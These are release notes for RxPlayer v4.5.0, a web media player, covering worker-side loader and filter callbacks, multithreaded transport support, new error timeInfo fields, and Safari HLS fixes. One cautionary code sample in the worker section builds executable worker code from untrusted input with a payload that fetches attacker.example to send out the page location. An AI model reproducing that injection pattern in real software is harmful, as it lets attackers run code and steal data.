# Release v4.5.0 (2026-07-06)

<p align="center">
  <b>Quick Links:</b>
<br>
  <a href="https://developers.canal-plus.com/rx-player/versions/4.5.0/doc/api/Overview.html">📖 <b>API documentation</b></a>
  -
  <a href="https://developers.canal-plus.com/rx-player/versions/4.5.0/demo/index.html">⏯ <b>Demo</b></a>
  -
  <a href="https://developers.canal-plus.com/rx-player/versions/4.5.0/doc/Getting_Started/Migration_From_v3/Overview.html">🎓 <b>Migration guide from v3</b></a>
</p>

- [:mag: **Overview**](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#overview)
- [:bookmark_tabs: **Changelog**](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#changelog)
- [Application-defined worker logic](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#worker-callbacks)
- [More complete `MULTI_THREAD` transport support](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#multithread-transports)
- [A more shared core path internally](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#shared-core-path)
- [More explicit out-of-bounds errors](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#timeinfo)
- [The `reload` API is now easier to integrate](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#less-surprises)
- [Thumbnail improvements](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#thumbnails)
- [CMCD updates](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#cmcd)
- [Safari and native HLS improvements](https://github.com/canalplus/rx-player/releases/tag/v4.5.0#safari-hls)

<a name="overview"></a>

## :mag: Overview

This new release adds several fixes and features:

- The biggest update here is on the `MULTI_THREAD` experimental feature: applications can now bring their complex `manifestLoader`, `segmentLoader` and `representationFilter` logic that will run worker-side.

  This is done by letting you build your own separate RxPlayer worker bundle, through a wrapper with a simple API exported from the `rx-player/experimental/worker` path. Once bundled you can then provide the resulting file/build to the RxPlayer's usual `attachWorker` API.

- Moreover, it's now possible through the same worker bundle feature to add "`transport`" features that were previously unavailable in multithreading mode: `SMOOTH`, `DASH_WASM`, `LOCAL_MANIFEST` and `METAPLAYLIST`.

  This means that no feature should now be missing from the multithreading mode, aside from `directfile` which would not really profit from it anyway.

- We also have done a big internal change now that we're trying to ensure the multithreading API stays stable and thus remove its "experimental" label: a large part of the monothreaded and multithreaded codebase has been merged into one shared path. This should simplify maintenance and make future behavior differences between both modes less likely.

- We added more information to `MEDIA_TIME_BEFORE_MANIFEST` and `MEDIA_TIME_AFTER_MANIFEST` errors

- We fixed multiple Safari / native-HLS edge cases

- We improved thumbnail handling

- We fixed a small memory leak linked to quality changes

- and we brought several smaller API and playback behavior improvements.

<a name="changelog"></a>

## Changelog

### Features

- `MULTI_THREAD`: Allow applications to define their own `representationFilter`, `segmentLoader` and `manifestLoader` callbacks worker-side [#1719]
- `MULTI_THREAD`: Enable adding most transport features worker-side (`DASH`, `DASH_WASM`, `SMOOTH`, `LOCAL_MANIFEST` and `METAPLAYLIST`) to play them in `"multithreading"` mode [#1783]
- `MediaError` with the code `MEDIA_TIME_BEFORE_MANIFEST` and `MEDIA_TIME_AFTER_MANIFEST` now have a `timeInfo` property to make explicit the exact boundaries and present position linked to the issue [#1838]

### Bug fixes

- Fix memory leak linked to quality changes [#1781]
- DRM: When a license request times out, now send a `KEY_LOAD_TIMEOUT` error instead of `KEY_LOAD_ERROR`
- DRM: Fix `"close-session"` handling that could unnecessarily close other DRM sessions
- On Safari when beginning at `0`, seek explicitly to `0` because its native HLS player would otherwise start at live position [#1803]
- Ignore unhandled runtime track types for period advertisement [#1850]
- Fix `startAt.wallClockTime` on Safari HLS live playlists [#1799]
- Fix rare scenario when an ended live audio content would not have its duration known until the end-of-stream [#1801]
- TTML: Do not apply percentage line heights anymore as they are sometimes subtly broken [#1812]
- Thumbnails: Fix shared thumbnail requests (through multiple `HTMLElement` for the same data) in `MULTI_THREAD` mode [#1830]
- Thumbnails: Fix thumbnail request sometimes being wrongly cancelled [#1810]
- API: Fix incomplete format in the initial `audioRepresentationChange` event
- CMCD: fix the `headers` CMCD `communicationType` [#1809]
- fix precision difference which triggered frequent content boundaries warnings [#1848]
- Compat: To fix an issue with some older LG TV when playing retro-compatible Dolby Vision contents, patch out some Dolby Vision-related ISOBMFF boxes in some conditions [#1818]
- Do not send a `streamEvent` twice after temporarily switching to the `RELOADING` state while playing it [#1828]
- Compat/DRM: Preserve `pssh` boxes in encrypted initialization segments on some DStv set-top boxes to fix playback of encrypted playback on them [#1822]
- Text: Continue playback if subtitle initialization fails instead of remaining stuck in `LOADING` [#1827]
- directfile: fix side effects for multiple instances of media element track store [#1845]
- directfile/compat: fix issue on Safari with startAt.fromLivePosition with directfile content when duration is infinite [#1842]

### Other improvements

- Adaptive bitrate: React faster to sudden bandwidth drops when playback is close to starving [#1831]
- Add `getMaximumPosition` and `getMinimumPosition` support when using directfile with HLS playlists on Safari [#1800]
- CMCD: Avoid sending invalid CMCD values when playback rate is `0` or negative, and better escape string values [#1833]
- Fix ordering of a PeriodChange/AdaptationChange couple that may have previously led to unnecessary duplicate events [#1764]
- Text track id can only be string [#1785]
- The reload API now only throws if no `loadVideo` call has been made before [#1767]
- Use native base64-bytes conversion utils when they exist [#1786]
- Merge most of the multithreaded and monothreaded codebase to simplify maintenance [#1627]

<a name="worker-callbacks"></a>

## `MULTI_THREAD`: Application-defined worker logic

Applications can define custom loading and filtering logic through `loadVideo` options such as `manifestLoader`, `segmentLoader` and `representationFilter`. Those can be used for multiple advanced needs: peer-to-peer integrations, alternative application-known URLs, pre-processing of loaded data, or filtering out media qualities based on specific constraints.

Yet in multithreading mode (under the `MULTI_THREAD` feature), those APIs weren't available. This was because the logic needing those callbacks would there most likely run in a WebWorker, yet be originally written outside of it: in your application's code.

Sending arbitrary JavaScript functions to a WebWorker is not something we can do reliably: the browser mostly gives us message passing, which means those function's code would need to be serialized, e.g. to their stringified content. Serialization breaks common JavaScript assumptions such as accessing variables defined outside your function and some build-tool transformations (e.g. your build tool writing some helpers that would be accessed inside that function, or that could be unavailable in a WebWorker context).

<img alt="RELEASE_NOTES_v4 5 0_regular_function_worker_boundary" src="https://github.com/user-attachments/assets/de0cffaa-b2d5-405c-896a-26e0693d4d7e" />

_Schema: The previous `representationFilter` API for multithreading mode removed several assumptions from regular JavaScript code, that made it very hard to implement._

We previously tried to work around that for `representationFilter` with a stringified function format. It made it explicit that this function would not be running under regular JavaScript assumptions, but it was not very pleasant to write nor to maintain and very easy to get wrong.

For example, to keep only video Representations up to 1080p, you previously had to provide the function as a string:

```javascript
rxPlayer.loadVideo({
  url,
  transport: "dash",
  representationFilter: `function (representation, context) {
    if (context.trackType !== "video") {
      return true;
    }
    var width = representation.width;
    var height = representation.height;
    return width != null && height != null && width <= 1920 && height <= 1080;
  }`,
});
```

This was at least explicit: what is sent to the worker is not a normal closure carrying its environment with it. Yet it also meant losing syntax highlighting and type-checking in most setups, making escaping mistakes more likely and the code much harder to maintain.

With a partner application, we even ended up reviewing all changes to their `representationFilter` logic to make sure it complied with those rules, corresponded to their target JS (ES5-compatible) and did not open the door for security problems (e.g. interpreting an untrusted input in that implementation).

An example for a very wrong version would have been to build that string from uncontrolled external input and let it become executable code in the worker:

```javascript
const externalInput =
  "true; fetch('https://attacker.example/collect?' + self.location.href);";

rxPlayer.loadVideo({
  url,
  transport: "dash",
  representationFilter: `function (representation, context) {
    if (context.trackType !== "video") {
      return true;
    }
    return ${externalInput};
  }`,
});
```

All those issues were already known initially, which is why we only tried this string solution with the usually simpler `representationFilter` API - as a test.

Now we propose a new solution that should be both more convenient and safer for application developers. Instead of having to write weird not-exactly-JS stringified logic, they can just write the code like they usually do and then build the RxPlayer worker themselves:

<img alt="RELEASE_NOTES_v4 5 0_two_application_bundles" src="https://github.com/user-attachments/assets/a0f1fb6b-c43f-4635-99b2-f0e8c6df2a25" />

_Schema: this new API lets you define the RxPlayer worker yourself. In that situation you can add whatever code you want on top and then handle the bundling transpiling yourself._

For example, you can create a separate worker bundle that "registers" a `representationFilter`:

```javascript
import RxPlayerWorker from "rx-player/experimental/worker";
import { DASH } from "rx-player/experimental/worker/features";

RxPlayerWorker.addFeatures([DASH]);

const rxPlayerWorker = new RxPlayerWorker();

rxPlayerWorker.registerRepresentationFilter(
  "resolution-based-filter",
  (representationInfo, context) => {
    if (context.trackType === "video") {
      const { width, height } = representationInfo;
      return width != null && height != null && width <= 1920 && height <= 1080;
    }
    return true;
  },
);
```

The worker has to be bundled separately and can then just be communicated to the RxPlayer through the same `attachWorker` API that you would have used in other multithreading scenarios:

```javascript
import RxPlayer from "rx-player";

const rxPlayer = new RxPlayer({ videoElement });
rxPlayer.attachWorker({
  // Here the URL to the bundled worker
  workerUrl,
});

rxPlayer.loadVideo({
  // You can now refer to your registered `representationFilter` through its
  // declared "workerId" identifier
  representationFilter: { workerId: "resolution-based-filter" },

  // ...
});
```

The same general mechanism also exists for `segmentLoader` and `manifestLoader`.

We also added APIs to communicate with the worker from the main application bundle. This makes it possible to update worker-side state without rebuilding a new worker each time.

<img alt="bundles responsibilities" src="https://github.com/user-attachments/assets/27bdde6f-282c-4906-9d7c-41f250bfbe77" />

_Schema: The responsibilities of the two bundles. Your application code continue to be in your usual application logic, but you can define callbacks and process custom runtime events in the RxPlayer worker to tweak the corresponding rx-player callbacks._

Note that all complexities around communication between the two bundles are already handled by the RxPlayer here, an application _just_ has to produce and provide the separate worker bundle and call a few documented RxPlayer API. Complete examples can be found in the new [Importable Worker documentation page](XXX TODO).

<a name="multithread-transports"></a>

## `MULTI_THREAD`: More complete transport support

Another important improvement for the `MULTI_THREAD` feature is that most transport features can now be added worker-side: `DASH`, `DASH_WASM`, `SMOOTH`, `LOCAL_MANIFEST` and `METAPLAYLIST`.

This means that you can now play e.g. Smooth streaming contents in multithreading mode. We didn't permit anything other than `DASH` before as we both needed a way for applications to be able to add features to the RxPlayer worker logic (that is one of the main features of this release) and because we had to make some code updates to ensure all of them can run in our worker.

For example, Smooth support needed a specific effort because its Manifest parser relied on DOM APIs that are not available in the same way from a WebWorker. To make it work, we had to transition to the same full-JS fast XML parser approach as our `DASH` Manifest parser.

There's however one missing transport here: `directfile` (through the `DIRECTFILE` feature). Yet porting that one made much less sense as most of its logic is performed by the browser anyway, thus it would probably not gain much by running in multithreading mode.

<a name="shared-core-path"></a>

## `MULTI_THREAD`: A more shared core path internally

Historically, multithreaded and monothreaded logic had distinct initialization logic and some separate concepts. This made sense when `MULTI_THREAD` was introduced as it was very experimental and weren't sure of how it would evolve, but it made the code harder to maintain and made behavior differences between both modes easier to introduce.

Now that it's pretty clear to us that multithreading mode will be a long-term API, we decided to do something about it: we merged most of the unique logic both modes had into only one code path.

There are some differences between the two (as one of those modes mostly runs in a WebWorker yet the other does not) but they have been kept minimal:

- There's now a thin communication layer between the code running always in main-thread (decryption handling, API, HTML5 media monitoring...) and the code that would run in a WebWorker if we're in multithreading mode (manifest+segment loading/parsing, adaptive logic, buffer management...).

  That "communication layer" allows to exchange messages between both. There is a multithreaded flavor (which uses the [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Worker/postMessage) API to transmit those messages) whereas our monothreaded implementation just uses a simple event listener logic for those same messages.

<img alt="RELEASE_NOTES_v4 5 0_core_interface_shared_path" src="https://github.com/user-attachments/assets/2eb64929-ed68-41ad-bc7c-e48909d49546" />

_Schema: How the inner architecture of the RxPlayer was updated. Instead of two independent paths each importing and using blocks of the RxPlayer separately, we've now merged most of it into one path._

- Also we had to do a few tweaks to ensure we didn't degrade the monothreaded mode: we e.g. might want to share some data structures in that mode whereas the multithreaded mode has to go through a serialization step and synchronization. We kept that difference for efficiency reasons, yet this could lead in the future to some behavior change and bugs (e.g. mutations being shared in one mode but not the other) if we're not careful about it.

  Thankfully, most of that complexity is centralized around a single structure (our `Manifest` concept), so we could here make it work without sacrificing code readability too much.

The end goal was to remove duplicated logic, reduce accidental differences between both modes, and make our tests more valuable: when both modes go through more of the same code, a test written for one mode is more likely to protect the other one too.

This should not change the public API in any way. Yet we still wanted to mention it as it is a large internal change and as it also explain why this release contains multiple small fixes around `MULTI_THREAD`, monothreaded Manifest updates and event ordering.

<a name="timeinfo"></a>

## More explicit out-of-bounds errors

Some dynamic contents have a moving playable window.

You can think for example of live contents: the maximum position evolves over time as newer audio/video becomes available, yet often the minimum position also does as old data is removed server-side to make some space. Because of that, an application can sometimes ask for a position that is not available anymore, or not available yet.

The RxPlayer already reported those cases through `MEDIA_TIME_BEFORE_MANIFEST` and `MEDIA_TIME_AFTER_MANIFEST` errors.

_TODO: Add a small schema for a dynamic Manifest window: minimum position / requested position / maximum position, before introducing the new `timeInfo` object._

There was something missing with those errors though: they did not communicate what the position we were at when we sent the error nor what the "safe" position to play would be.

We initially assumed that the user could just rely on other APIs like `getPosition()` and `getMinimumPosition()` / `getMaximumPosition()` to obtain that information, but under some edge cases those weren't enough: (TODO: Which edge cases? I do not remember)

In `v4.5.0`, those errors thus now expose a `timeInfo` property with more context on the issue. This property indicates the relevant boundary and the position that led to the error.

This should make it easier for applications to decide how to recover:

```javascript
rxPlayer.addEventListener("warning", (error) => {
  if (error.code === "MEDIA_TIME_BEFORE_MANIFEST") {
    const { position, minPosition } = error.timeInfo;

    console.warn(
      `Position ${position} is before the current Manifest start: ${minPosition}`,
    );
  } else if (error.code === "MEDIA_TIME_AFTER_MANIFEST") {
    const { position, maxPosition } = error.timeInfo;

    console.warn(
      `Position ${position} is after the current Manifest end: ${maxPosition}`,
    );
  }
});
```

This is mostly useful for live or dynamic contents where the application may want to display a specific message, retry at a corrected position, or adapt its own UI to the available content boundaries.

<a name="less-surprises"></a>

## The `reload` API is now easier to integrate

The [`reload`](https://developers.canal-plus.com/rx-player/versions/4.4.1/doc/api/Basic_Methods/reload.html) API allows to re-load from scratch the last content loaded through a `loadVideo` call, even if it failed on an error or was stopped since.

Previously, `reload` could throw when `reloadAt.relative` was used before the RxPlayer had been able to know the previous content position. This single case would generally force applications into an awkward `try` / `catch` logic just because a previous content did not reach the right state soon enough.

_TODO: Add a small before/after code or sequence diagram: application previously wrapping `reload` in `try` / `catch`, versus the new behavior where the relative offset is ignored when no previous position is known._

After looking at some application code, we decided to remove this as a reason to throw, instead we're now just ignoring that relative offset - as how it should be interpreted here is ambiguous.

This has been done only to simplify application code and their expectations. They can mostly assume that `reload` does not throw anymore.

There's actually one remaining case where it can, but this one does not make much sense from an application perspective: it still throws if `reload` is called before any `loadVideo` call has been made - as there's nothing to reload.

<a name="thumbnails"></a>

## Thumbnail improvements

Thumbnail handling also gained a few small fixes.

_TODO: Add a screenshot or sequence schema for `renderThumbnail` called twice for the same image, one call cancelled, and the shared request continuing for the remaining caller._

- cancelling one `renderThumbnail` request should no longer cancel the shared request pipeline still needed by another request for the same thumbnail;

- requesting a thumbnail outside of the available thumbnail range should now propagate the expected `NO_THUMBNAIL` error instead of a more generic `NOT_FOUND` error;

- shared thumbnail requests are now fixed in `MULTI_THREAD` mode too.

<a name="cmcd"></a>

## CMCD updates

We also updated how we handled CMCD, a way of providing playback metrics to the CDN (through either a query string of HTTP headers).

CMCD values are now more conservative in edge cases:

- we avoid sending some optional values when the playback rate is `0` or negative where the semantics of those values in the specification are unclear
- We had an issue that basically broke communication of CMCD values through HTTP headers, that we've now fixed
- we reinforced string value escaping

<a name="safari-hls"></a>

## Safari and native HLS improvements

Applications often use our [`directfile` transport](https://developers.canal-plus.com/rx-player/versions/4.5.0/doc/api/Loading_a_Content.html#transport) to be able to play HLS contents on Safari.

In that scenario, the browser may expose timing information through its own media element APIs instead of through Manifest and segment data loaded and parsed by the RxPlayer. That can lead to subtle differences, especially for live contents or when starting from a position relative to the live edge.

_TODO: Add some schema/graphic_

We fixed multiple cases around that:

- the `startAt.wallClockTime` `loadVideo` option should now work better on Safari HLS live playlists;

- `startAt.fromLivePosition` is fixed for directfile contents when the duration is infinite;

- the `getMinimumPosition` and `getMaximumPosition` methods now better consider that Safari HLS case, which should make them more precise.

- when explicitly asked to begin at `0`, the RxPlayer now also explicitly seeks to `0`, avoiding a Safari native-HLS behavior where playback could instead start at the live position.
